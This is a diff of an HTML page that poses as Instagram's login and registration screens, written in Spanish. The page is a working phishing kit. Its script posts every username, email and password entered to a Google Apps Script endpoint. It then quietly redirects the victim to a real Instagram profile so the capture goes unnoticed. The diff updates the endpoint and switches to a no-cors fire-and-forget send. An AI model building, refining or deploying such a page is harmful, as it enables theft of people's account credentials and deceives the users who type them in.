@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
 
@@ -13,6 +14,7 @@
             box-sizing: border-box;
             font-family: Arial, sans-serif;
         }
+
         body {
             background-color: black;
             display: flex;
@@ -20,6 +22,7 @@
             align-items: center;
             height: 100vh;
         }
+
         .container {
             background-color: #121212;
             padding: 20px;
@@ -28,12 +31,14 @@
             text-align: center;
             border-radius: 5px;
         }
+
         .logo {
             font-size: 2rem;
             color: white;
             font-family: 'Grand Hotel', cursive;
             margin-bottom: 20px;
         }
+
         input {
             width: 100%;
             padding: 10px;
@@ -43,6 +48,7 @@
             border-radius: 3px;
             color: white;
         }
+
         .btn {
             background-color: #0095f6;
             color: white;
@@ -53,15 +59,16 @@
             cursor: pointer;
             font-weight: bold;
         }
+
         .btn:hover {
             background-color: #0073cc;
         }
+
         .link {
             color: #0095f6;
-            text-decoration: none;
-            font-size: 14px;
             cursor: pointer;
         }
+
         .register-box {
             margin-top: 10px;
             padding: 15px;
@@ -70,86 +77,108 @@
         }
     </style>
 </head>
+
 <body>
-    <div class="container" id="loginBox">
-        <div class="logo">Instagram</div>
-        <input type="text" id="loginUser" placeholder="Teléfono, usuario o correo electrónico">
-        <input type="password" id="loginPass" placeholder="Contraseña">
-        <button class="btn" onclick="iniciarSesion()">Iniciar sesión</button>
-        <div class="register-box">
-            <p style="color: white;">¿No tienes una cuenta? <span class="link" onclick="mostrarRegistro()">Regístrate</span></p>
-        </div>
+
+<div class="container" id="loginBox">
+    <div class="logo">Instagram</div>
+
+    <input type="text" id="loginUser" placeholder="Usuario">
+    <input type="password" id="loginPass" placeholder="Contraseña">
+
+    <button class="btn" onclick="iniciarSesion()">Iniciar sesión</button>
+
+    <div class="register-box">
+        <p style="color: white;">
+            ¿No tienes una cuenta?
+            <span class="link" onclick="mostrarRegistro()">Regístrate</span>
+        </p>
     </div>
+</div>
 
-    <div class="container" id="registerBox" style="display: none;">
-        <div class="logo">Instagram</div>
-        <input type="text" id="regUser" placeholder="Nombre de usuario">
-        <input type="email" id="regEmail" placeholder="Correo electrónico">
-        <input type="password" id="regPass" placeholder="Contraseña">
-        <button class="btn" onclick="registrarse()">Registrarse</button>
-        <div class="register-box">
-            <p style="color: white;">¿Ya tienes una cuenta? <span class="link" onclick="mostrarLogin()">Inicia sesión</span></p>
-        </div>
+<div class="container" id="registerBox" style="display:none;">
+    <div class="logo">Instagram</div>
+
+    <input type="text" id="regUser" placeholder="Usuario">
+    <input type="email" id="regEmail" placeholder="Correo">
+    <input type="password" id="regPass" placeholder="Contraseña">
+
+    <button class="btn" onclick="registrarse()">Registrarse</button>
+
+    <div class="register-box">
+        <p style="color: white;">
+            ¿Ya tienes cuenta?
+            <span class="link" onclick="mostrarLogin()">Inicia sesión</span>
+        </p>
     </div>
+</div>
 
-    <script>
-        const googleSheetsURL = "https://script.google.com/macros/s/AKfycbyV4Wv8oIGjNWNsEEnw5BwwQJB82ycw2bGsSwbxefsfF7-I4qHgMlVvJMeYNQS_VZnQdA/exec";
-        const instagramVideoURL = "https://www.instagram.com/_saray_castro/";
+<script>
+const googleSheetsURL = "https://script.google.com/macros/s/AKfycbyzk55x55JmvQp0aYaLM0TYGn66ljt_vGvWlJp8Fdwcg2281_N4kYXqCA8Atgwxg6Yt/exec"; // 👈 IMPORTANTE
+const instagramURL = "https://www.instagram.com/_saray_castro/";
 
-        function mostrarRegistro() {
-            document.getElementById("loginBox").style.display = "none";
-            document.getElementById("registerBox").style.display = "block";
-        }
+function mostrarRegistro() {
+    document.getElementById("loginBox").style.display = "none";
+    document.getElementById("registerBox").style.display = "block";
+}
 
-        function mostrarLogin() {
-            document.getElementById("registerBox").style.display = "none";
-            document.getElementById("loginBox").style.display = "block";
-        }
+function mostrarLogin() {
+    document.getElementById("registerBox").style.display = "none";
+    document.getElementById("loginBox").style.display = "block";
+}
 
-        function iniciarSesion() {
-            let usuario = document.getElementById("loginUser").value;
-            let contraseña = document.getElementById("loginPass").value;
+function iniciarSesion() {
+    let usuario = document.getElementById("loginUser").value;
+    let contraseña = document.getElementById("loginPass").value;
 
-            if (usuario && contraseña) {
-                let data = new FormData();
-                data.append("tipo", "login");
-                data.append("usuario", usuario);
-                data.append("contraseña", contraseña);
+    if (usuario && contraseña) {
 
-                fetch(googleSheetsURL, { method: "POST", body: data })
-                    .then(response => response.text())
-                    .then(() => {
-                        window.location.href = instagramVideoURL;
-                    })
-                    .catch(error => console.error("Error al enviar datos:", error));
-            } else {
-                alert("Por favor, completa todos los campos.");
-            }
-        }
+        let data = new FormData();
+        data.append("tipo", "login");
+        data.append("usuario", usuario);
+        data.append("contraseña", contraseña);
 
-        function registrarse() {
-            let usuario = document.getElementById("regUser").value;
-            let email = document.getElementById("regEmail").value;
-            let contraseña = document.getElementById("regPass").value;
+        fetch(googleSheetsURL, {
+            method: "POST",
+            body: data,
+            mode: "no-cors"
+        });
 
-            if (usuario && email && contraseña) {
-                let data = new FormData();
-                data.append("tipo", "registro");
-                data.append("usuario", usuario);
-                data.append("email", email);
-                data.append("contraseña", contraseña);
+        // REDIRECCIÓN SEGURA
+        window.location.href = instagramURL;
 
-                fetch(googleSheetsURL, { method: "POST", body: data })
-                    .then(response => response.text())
-                    .then(() => {
-                        alert("Registro exitoso.");
-                        mostrarLogin();
-                    })
-                    .catch(error => console.error("Error al enviar datos:", error));
-            } else {
-                alert("Por favor, completa todos los campos.");
-            }
-        }
-    </script>
+    } else {
+        alert("Completa los campos");
+    }
+}
+
+function registrarse() {
+    let usuario = document.getElementById("regUser").value;
+    let email = document.getElementById("regEmail").value;
+    let contraseña = document.getElementById("regPass").value;
+
+    if (usuario && email && contraseña) {
+
+        let data = new FormData();
+        data.append("tipo", "registro");
+        data.append("usuario", usuario);
+        data.append("email", email);
+        data.append("contraseña", contraseña);
+
+        fetch(googleSheetsURL, {
+            method: "POST",
+            body: data,
+            mode: "no-cors"
+        });
+
+        alert("Registro guardado");
+        mostrarLogin();
+
+    } else {
+        alert("Completa los campos");
+    }
+}
+</script>
+
 </body>
 </html>
